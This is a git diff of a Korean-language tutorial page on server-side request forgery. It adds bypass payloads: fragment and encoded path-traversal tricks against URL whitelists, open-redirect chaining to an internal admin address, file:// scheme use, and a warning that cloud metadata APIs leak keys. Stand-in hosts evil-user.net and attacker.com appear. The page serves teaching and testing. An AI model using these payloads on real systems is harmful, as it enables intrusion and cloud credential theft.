@@ -92,7 +92,7 @@ http://instance-data/latest/meta-data/public-keys/
 # Bypass  
 ## URL Parser 의 pasing 방법부터 알아보자.
 
-![그림 1-1](image.png)
+![그림 1-1](/assets/image/vuln/web-vuln/SSRF/image.png)
 위와 같은 형식으로 URI를 나누어서 해석할 수 있다.
 💡 **<u>각 Parser 마다 pasing 방법이 상이할 수 있다.</u>** 
 {: .notice--primary} 
@@ -262,3 +262,47 @@ http://1.1.1.1 &@2.2.2.2# @3.3.3.3/<br>
 #Parameter pollution<br>
 next={domain}&next=attacker.com
 </div>
+
+**<u style="color:red;">AWS 외에도 GCP, Azre, Digital Ocean등 public cloud를 사용하는 경우 Metadata API 로의 접근을 통해 instance에 대한 정보를 얻거나 중요한 키 값을 얻어 시스템을 탈취할 수 있다.</u>** 
+![그림 1-2](/assets/image/vuln/web-vuln/SSRF/image-1.png)
+
+### 입력값(URL)이 특정 경로 또는 확장자로 끝나거나, 화이트리스트에 등록된 패스가 포함되어야 하는 경우라면?
+
+<div class="notice--primary" markdown="1">
+https://metadata/vulerable/path#/expected/path<br>
+https://metadata/vulerable/path#.extension<br>
+https://metadata/expected/path/..%2f..%2f/vulnerable/path<br>
+위와같이 사용할 수 있다.
+</div>
+
+## Bypass via open redirect
+SSRF 에 대한 검증 절차가 잘 이루어져 있어 공격이 힘들 경우 Open redirect를 통한 우회가 가능하다.
+
+<div class="notice--primary" markdown="1">
+GET /product/choiseProduct?choiseProductId=6&path=http://evil-user.net
+</div>
+위와 같은 url 과 reirect 기능이 존재하는 요청문이 있다면,
+http://evil-user.net로 redirect 될것이다. 이부분을 아래와같이 악용할 수 있다.
+
+<div class="notice--primary" markdown="1">
+GET /product/choiseProduct?choiseProductId=6&path=http:192.168.0.10/admin
+</div>
+위 내용을 SSRF 취약점이 예상되는 API 앤드포인트에 적어주면 된다.
+<div class="notice--primary" markdown="1">
+POST /product/choise HTTP/2
+
+'''
+'''
+'''
+
+api-endpoing=/product/choiseProduct?choiseProductId=6&path=http:192.168.0.10/admin
+</div>
+
+💡 **<u style="color:red;">특정 기능에서 http://uri~ 로의 요청 로직이 있을 경우 이 때 file 과 같은 다른 URI 스킴을 사용할 수 있으며, file 스킴의 경우 file:/, file://, file:/// 모두 사용할 수 있다.</u>** 
+{: .notice--primary} 
+
+# Referance
+- https://www.hahwul.com/cullinan/ssrf/
+- https://www.igloo.co.kr/security-information/category/issue/page/1/
+- https://portswigger.net/web-security/ssrf
+- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass
